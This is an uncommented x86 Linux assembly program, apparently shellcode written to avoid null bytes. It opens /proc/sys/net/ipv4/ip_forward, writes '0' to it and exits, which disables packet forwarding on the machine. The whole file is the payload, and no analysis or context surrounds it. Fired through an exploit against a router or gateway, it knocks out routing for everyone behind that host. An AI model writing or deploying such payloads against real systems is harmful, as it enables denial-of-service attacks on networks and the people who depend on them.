section .text
global _start

_start:


        xor eax,eax
        push eax
        push dword 0x64726177
        push dword 0x726f665f
        push dword 0x70692f34
        push dword 0x7670692f
        push dword 0x74656e2f
        push dword 0x2f737973
        push dword 0x2f636f72
        push word 0x702f

        mov ebx,esp
        xor ecx,ecx
        mov cl,0x1
        mov al,0x5
        int 0x80

        mov ebx,eax
        xor ecx,ecx
        push ecx
        push byte +0x30
        mov ecx,esp
        xor edx,edx
        mov dl,0x1
        mov al,0x4
        int 0x80

        xor eax,eax
        add eax,byte +0x6
        int 0x80

        xor eax,eax
        inc eax
        xor ebx,ebx
        int 0x80

